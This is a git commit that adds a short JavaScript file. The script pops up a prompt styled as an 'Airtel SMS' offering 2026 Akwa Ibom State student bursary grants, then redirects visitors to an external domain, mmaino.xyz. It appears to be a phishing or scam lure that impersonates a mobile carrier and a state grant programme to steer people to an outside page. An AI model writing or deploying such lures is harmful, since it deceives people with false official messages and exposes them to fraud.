99729dfdd6677bfc3154476ba3f9ef0f9719b353
ztainz <johnsonmfon09@gmail.com>
2026-07-19 06:53:42 -0700

    Create act-aksbursary.js

---
+++ act-aksbursary.js
@@ -0,0 +1,6 @@
+var password = 'APPLY NOW'
+password=prompt('Airtel SMS: Dear Applicant, Kindly Apply for 2026 Akwa Ibom State 50,000 Students Bursaries Grants ,Student Bursary, press Apply Now ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://mmaino.xyz/aksbursary';
+}
+
